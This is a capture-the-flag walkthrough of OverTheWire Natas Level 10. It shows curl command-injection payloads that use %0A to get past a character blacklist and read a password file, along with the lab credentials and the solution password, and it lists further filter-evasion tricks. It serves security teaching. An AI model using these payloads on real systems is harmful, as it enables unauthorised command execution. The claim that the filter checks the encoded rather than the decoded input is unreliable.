---
title: "OverTheWire Natas Level 10 → 11: Command Injection Filter Bypass with URL-Encoded Newline"
description: "Level 10 filters semicolons, pipes, and ampersands. We bypass the filter using %0A — a URL-encoded newline that the shell treats as a command separator."
date: 2026-06-12
platform: OverTheWire
difficulty: easy
tags: [ctf, web, natas, overthewire, command-injection, filter-bypass, url-encoding, newline-injection]
series: "OverTheWire Natas"
order: 10
seriesLabel: "Level 10 → 11"
draft: false
---

> Part of a complete level-by-level Natas series. Each post is self-contained — if you want context on the setup and tooling, start with the [Intro & Setup](../natas-00-introduction/) post.

## Introduction

Level 10 is the natural follow-up to Level 9. Same application, same command injection vulnerability, but with a character filter added: `;`, `|`, and `&` are now blocked. If you only know the semicolon approach from the previous level, you are stuck. But the filter only blocks specific characters — and there are many ways to separate shell commands. The one that works here is `%0A`: a URL-encoded linefeed (newline) character. The shell treats a newline exactly like a semicolon — it ends the current command and starts a new one — but the filter does not know to block it.

This level teaches filter bypass and encoding evasion: the idea that character-level blacklists almost always have gaps, and that knowing your character encodings lets you slip through those gaps.

## Official Challenge Objective

> **Find words containing: [search box]** *(same as Level 9 but with a character filter)*

## Skills Covered

- Reading PHP source code to identify what is filtered and what is not
- Understanding URL encoding (`%XX`) and how the web server decodes it before it reaches the application
- Using `%0A` (URL-encoded newline / linefeed) as a shell command separator
- Recognising the limitations of character blacklists vs. allowlists
- Filter bypass methodology

## My Approach

I read the sourcecode first and mapped out exactly what the filter blocks. It uses a regex pattern `/[;|&]/` — blocking semicolons, pipes, and ampersands. I thought through which other characters separate shell commands: newline (`\n`, `%0A`), double-newline, and command substitution (`$()`, backticks). Newline is the simplest and most likely to work. I crafted a payload with `%0A` in place of `;` and it worked on the first try. I also included a trailing `%0A` before the `#` to ensure the comment character was on a separate line, though in practice the `#` alone would comment out `dictionary.txt` regardless.

## Step-by-Step Walkthrough

### Command

```bash
# First, read the source to understand the filter
curl http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/index-source.html
```

### Explanation

The PHP source shows the added filter:

```php
<?
$key = "";

if(array_key_exists("needle", $_POST)) {
    $key = $_POST['needle'];
}

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The `preg_match('/[;|&]/', $key)` check blocks input containing `;`, `|`, or `&`. If any of these characters appear in the input, the application rejects it and prints "Input contains an illegal character!" The underlying `passthru()` vulnerability is identical to Level 9 — only the input filtering changed.

### Why It Matters

This is the archetypal difference between a blacklist and an allowlist. The filter says "block these specific characters" — but there are many other characters that can separate shell commands. A proper allowlist would say "accept only alphanumeric characters and spaces" and reject everything else. Anything not explicitly forbidden in a blacklist is implicitly allowed, and that gap is where bypass lives.

---

### Command

```bash
# Confirm the filter is working — this should fail
curl -d "needle=;cat /etc/natas_webpass/natas11;#" -d "submit=Search" \
     http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/
```

### Explanation

This returns "Input contains an illegal character!" — confirming the filter catches the semicolon from the Level 9 payload. Good. Now I need an alternative.

### Why It Matters

Always confirm the filter is actually working before building a bypass. If it were not applied consistently (e.g., only filtering on certain parameter values), the Level 9 payload might still work. Knowing for certain that the filter blocks `;` tells me I need something else.

---

### Command

```bash
# The bypass: %0A is URL-encoded newline (\n)
# The shell treats \n the same as ; (command separator)
curl -d "needle=%0Acat /etc/natas_webpass/natas11%0A#" -d "submit=Search" \
     http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/
```

### Explanation

`%0A` is the URL percent-encoding for the ASCII linefeed character (LF, `\n`, decimal 10, hex 0x0A). When the web server receives this URL-encoded form data, it decodes `%0A` to the actual newline byte before passing the value to the PHP application. PHP then passes it to `passthru()`, which passes it to the shell. The shell sees:

```
grep -i 
cat /etc/natas_webpass/natas11
# dictionary.txt
```

A blank first line (grep with no arguments errors out), then `cat /etc/natas_webpass/natas11` on the second line, then a comment on the third. The `cat` command runs successfully and outputs:

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

The natas11 password is `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`.

### Why It Matters

`%0A` (newline) bypasses the filter because:
1. The filter checks the PHP-level string for `;`, `|`, and `&` — and `%0A` is not any of those characters.
2. The web server decodes `%0A` to `\n` before PHP receives the value.
3. The shell interprets `\n` as a command separator, identical to `;`.

The filter is checking the encoded form and then passing the decoded value to the shell. The decoding happens between the filter check and the shell execution — that ordering is the exploit.

---

### Command

```bash
# Verify the exact shell view by checking what the shell processes
# (conceptual - showing what passthru() receives after decoding)
# grep -i \ncat /etc/natas_webpass/natas11\n# dictionary.txt
# The shell sees this as three lines:
#   grep -i 
#   cat /etc/natas_webpass/natas11
#   # dictionary.txt
```

### Explanation

Breaking down what the shell actually receives after URL decoding:

- Line 1: `grep -i ` — grep with the `-i` flag but no pattern argument. This errors out, but errors do not stop subsequent commands from running.
- Line 2: `cat /etc/natas_webpass/natas11` — runs cleanly, outputs the password.
- Line 3: `# dictionary.txt` — shell comment, ignored entirely.

The `passthru()` function outputs everything to the browser: grep's error message (if any), the cat output, and any other stdout from the commands. The password appears in the browser mixed with potential error text, but it is clearly visible.

### Why It Matters

Understanding exactly what the shell sees after decoding is critical for debugging injection payloads. If a payload does not work, tracing the exact string that reaches the shell (before and after each encoding/decoding step) is how you diagnose and fix it.

---

### Command

```bash
# Alternative: newline injection without the trailing newline before #
curl -d "needle=%0Acat /etc/natas_webpass/natas11 #" -d "submit=Search" \
     http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/
```

### Explanation

The space before `#` makes the `#` start a new word in the shell, which is required for it to be interpreted as a comment character. Without a preceding space or newline, `#` attached to a command argument would be literal. With the space: `cat /etc/natas_webpass/natas11 # dictionary.txt` — the `# dictionary.txt` portion is a shell comment and is ignored. Both forms (with or without a trailing `%0A` before `#`) work here.

### Why It Matters

The precise rules for shell comment recognition matter in filter evasion. If the `#` character were also filtered, you would need to handle the trailing `dictionary.txt` differently — perhaps by redirecting stderr/stdout or by using another file path that does not affect the cat command.

## Deep Dive: Cyber Security Concept

**Filter bypass and character encoding evasion in command injection.**

Character blacklists for command injection protection are fundamentally weak because of the richness of shell syntax and the multiple encoding layers between the client and the shell:

```
Browser → URL encoding → Web server decoding → PHP string → Shell interpretation
```

Each layer has the potential to transform the data. A filter at the PHP layer sees PHP strings. But if the data was encoded for transmission, the decoding step may produce characters the filter did not check for. Common encoding bypass techniques:

- **`%0A`** (newline / LF): separates shell commands, not in most character blacklists
- **`%0D%0A`** (CRLF): same as newline on many systems
- **`$IFS`** (Internal Field Separator shell variable): substitutes for spaces when space is filtered
- **`${IFS}`**: same as above, useful when `$` followed by a letter might be interpreted
- **Backtick command substitution**: `` `command` `` if `$()` is filtered
- **Double encoding**: `%250A` (percent-encoding of `%` itself) when the application double-decodes
- **Null byte `%00`**: can terminate strings or bypass specific checks in some environments

The correct fix is always the same: do not use shell commands to process user input. If you must, use a strict allowlist that permits only the characters actually required for the legitimate use case, and use your language's shell escaping functions as an additional layer.

> [!IMPORTANT]
> Character blacklists for command injection prevention are nearly always bypassable. The correct mitigations are: (1) never construct shell commands from user input; (2) if unavoidable, use language-level APIs that avoid shell invocation; (3) if the shell is required, apply strict allowlist validation AND use proper shell escaping. Blacklists are last-resort measures, not primary defences.

## Offensive Security Perspective

Filter bypass is one of the most intellectually satisfying parts of web pentesting. The methodology when you hit a filter:

1. Map the filter precisely: what is blocked? Test each relevant character individually.
2. Consider encoding: can you achieve the same effect with URL encoding, HTML encoding, unicode escapes, or double encoding?
3. Consider alternatives: for each blocked character, what other characters or sequences achieve the same shell effect?
4. Consider context: is the filter case-sensitive? Does it strip or reject? Does it apply to all parameters or just some?
5. Consider environment: is there a WAF between you and the application that has its own bypass requirements?

Newline injection (`%0A`) is one of the first things I try whenever semicolons and pipes are blocked in command injection contexts, because it is in almost no one's blacklist and the shell treats it identically to `;`.

## Common Beginner Mistakes

- Giving up when the semicolon payload is blocked, not realising there are many alternatives.
- Forgetting that `%0A` must be included in the URL-encoded form data (curl handles this correctly when you put `%0A` in a `-d` string — it is already URL-encoded and the percent sign itself gets escaped, which... can cause confusion. Test to confirm the encoding is right.)
- Not noticing that the filter uses `preg_match` which only blocks the listed characters — not all shell metacharacters.
- Trying complex payloads before the simplest bypass.

## Key Takeaways

- `%0A` is a URL-encoded newline (`\n`, LF, 0x0A) — the shell treats it as a command separator, equivalent to `;`.
- Character blacklists (`[;|&]`) are incomplete by design: there are many other shell command separators not in the list.
- The encoding/decoding gap — filter checks PHP string, shell sees decoded bytes — is the core bypass mechanism.
- The correct fix for command injection is not a better blacklist; it is avoiding shell command construction from user input entirely.
- Newline injection is a first-attempt bypass technique whenever semicolons and pipes are blocked.

## How This Helps Build Cyber Security Expertise

- **Filter bypass methodology:** the systematic approach to bypassing filters (map the filter, consider encodings, consider alternatives) applies to SQLi, XSS, and all injection classes, not just command injection.
- **WAF evasion:** URL encoding and other encoding bypasses are standard WAF evasion techniques used in real engagements.
- **Encoding fluency:** understanding percent-encoding and which special bytes mean what in URL context is prerequisite knowledge for any web security work.
- **Defence in depth:** this level demonstrates why a single character filter is not sufficient; it motivates layered defences and proper input architecture.

## Additional Reading

- [OWASP — Command Injection Filter Bypass](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger — OS command injection — bypassing filters](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings — Command Injection bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [URL encoding reference (percent-encoding)](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding)

---

## Connect with the Author

Written by **Himangshu Pan** — cybersecurity researcher.

- **GitHub:** [@0xSh3ru](https://github.com/0xSh3ru)
- **LinkedIn:** [in/0xsh3ru](https://www.linkedin.com/in/0xsh3ru/)

*If this walkthrough helped, follow along on GitHub and connect on LinkedIn — questions and corrections are always welcome.*
